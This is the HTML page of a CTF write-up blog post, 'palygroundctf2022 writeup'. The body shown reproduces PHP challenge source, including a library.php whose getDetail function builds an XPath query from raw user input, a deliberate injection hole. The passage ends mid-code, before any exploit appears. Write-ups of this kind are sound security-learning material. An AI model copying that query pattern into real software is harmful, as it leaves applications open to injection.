@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="貌似可以传一个数组过去 然后去读文件？好像不太行 123456&#x2F;&#x2F;hint &lt;?php                if (isset($_GET[&amp;#x27;showsrc&amp;#x27;]) &amp;&amp; in_array($_GET[&amp;#x27;showsrc&amp;#x27;], Array(&amp;#x27;index.php&amp;#x27;, &amp;#x27;login.php&amp;#x27;,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="palygroundctf2022 writeup">
+<meta property="og:url" content="http://example.com/2022/08/22/palygroundctf2022/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="貌似可以传一个数组过去 然后去读文件？好像不太行 123456&#x2F;&#x2F;hint &lt;?php                if (isset($_GET[&amp;#x27;showsrc&amp;#x27;]) &amp;&amp; in_array($_GET[&amp;#x27;showsrc&amp;#x27;], Array(&amp;#x27;index.php&amp;#x27;, &amp;#x27;login.php&amp;#x27;,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220822233219673.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823003059974.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823003234438.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823003343541.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823004128051.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823013122267.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823002933085.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823003343541.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source/_posts/palygroundctf2022/image-20220823225017630.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source/_posts/palygroundctf2022/image-20220823225116691.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220823230543675.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source/_posts/palygroundctf2022/image-20220824011132772.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source/_posts/palygroundctf2022/image-20220824011901839.png">
+<meta property="og:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220824020113565.png">
+<meta property="article:published_time" content="2022-08-22T08:48:10.000Z">
+<meta property="article:modified_time" content="2022-08-23T18:36:42.675Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/22/palygroundctf2022/MyBlog/b1ue0cean.github.io/source_posts/palygroundctf2022/image-20220822233219673.png">
+
+
+<link rel="canonical" href="http://example.com/2022/08/22/palygroundctf2022/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/08/22/palygroundctf2022/","path":"2022/08/22/palygroundctf2022/","title":"palygroundctf2022 writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>palygroundctf2022 writeup | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">92</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">73</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">128</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JWT-Decoder"><span class="nav-number">1.1.</span> <span class="nav-text">JWT Decoder</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95%EF%BC%88%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD%E8%AF%B7%E7%9B%B4%E6%8E%A5%E7%9C%8Bsolution"><span class="nav-number">1.1.1.</span> <span class="nav-text">原型链污染的失败尝试（胡言乱语请直接看solution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2022-29078"><span class="nav-number">1.1.2.</span> <span class="nav-text">CVE-2022-29078</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#solution"><span class="nav-number">1.1.3.</span> <span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OnlineEducation"><span class="nav-number">1.2.</span> <span class="nav-text">OnlineEducation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Imageium"><span class="nav-number">1.3.</span> <span class="nav-text">Imageium</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Datascience-Class"><span class="nav-number">1.4.</span> <span class="nav-text">Datascience Class</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OnlineNotepad"><span class="nav-number">1.5.</span> <span class="nav-text">OnlineNotepad</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/22/palygroundctf2022/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="palygroundctf2022 writeup | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          palygroundctf2022 writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-08-22 16:48:10" itemprop="dateCreated datePublished" datetime="2022-08-22T16:48:10+08:00">2022-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-24 02:36:42" itemprop="dateModified" datetime="2022-08-24T02:36:42+08:00">2022-08-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>貌似可以传一个数组过去 然后去读文件？好像不太行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>], <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>, <span class="string">&#x27;library.php&#x27;</span>, <span class="string">&#x27;paperdetail.php&#x27;</span>), <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">check_param</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">check_param</span>(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">checkUser</span>(<span class="variable">$username</span>, <span class="variable">$pwd</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_param</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$var</span>]) || <span class="variable">$_POST</span>[<span class="variable">$var</span>] === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="variable">$var</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$username</span> === <span class="string">&quot;&quot;</span>) || (<span class="variable">$pwd</span> === <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$accounts</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;accounts.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$accounts</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$users</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$accounts</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$users</span>, <span class="string">&quot;guest:&quot;</span>.<span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="string">&quot;guest&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$granted</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$each</span>) &#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;:&quot;</span>,<span class="variable">$each</span>);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="variable">$username</span> === <span class="title function_ invoke__">trim</span>(<span class="variable">$info</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$pwd</span>) === <span class="title function_ invoke__">trim</span>(<span class="variable">$info</span>[<span class="number">1</span>]) ) &#123;</span><br><span class="line">                <span class="variable">$granted</span> = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$granted</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;library.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$papers</span> = <span class="title function_ invoke__">loadPapers</span>(<span class="string">&#x27;papers.xml&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//library.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_library_file_name</span> = <span class="string">&#x27;/db/papers.xml&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadPapers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$_library_file_name</span>;</span><br><span class="line">        <span class="variable">$xml</span> = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">        <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$_library_file_name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$xml</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">paperList</span>(<span class="params">DomDocument <span class="variable">$papers</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="title class_">DOMXPath</span>(<span class="variable">$papers</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&#x27;/Papers/Paper[@published=&quot;yes&quot;]&#x27;</span>;</span><br><span class="line">        <span class="variable">$paper_list</span> = <span class="variable">$xpath</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$paper_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getFirstChildText</span>(<span class="params">DOMNode <span class="variable">$node</span>, <span class="keyword">string</span> <span class="variable">$tag</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$node</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="variable">$tag</span>)-&gt;<span class="title function_ invoke__">item</span>(<span class="number">0</span>)-&gt;nodeValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">DomDocument <span class="variable">$papers</span>, <span class="keyword">string</span> <span class="variable">$idx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="title class_">DOMXPath</span>(<span class="variable">$papers</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;//Paper[Idx/text()=&#x27;&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&#x27; and @published=&#x27;yes&#x27;]&quot;</span>;</span><br><span class="line">        <span class="variable">$paper_list</span> = <span class="variable">$xpath</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paper_list</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Invalid XPATH expression&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paper_list</span>-&gt;<span class="title function_ invoke__">count</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;No such entity&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$paper</span> = <span class="variable">$paper_list</span>-&gt;<span class="title function_ invoke__">item</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Success&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;Title&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Title&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Author&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Conference&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Conference&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Year&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Year&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Abstract&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Abstract&#x27;</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paperdetail.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;library.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$papers</span> = <span class="title function_ invoke__">loadPapers</span>(<span 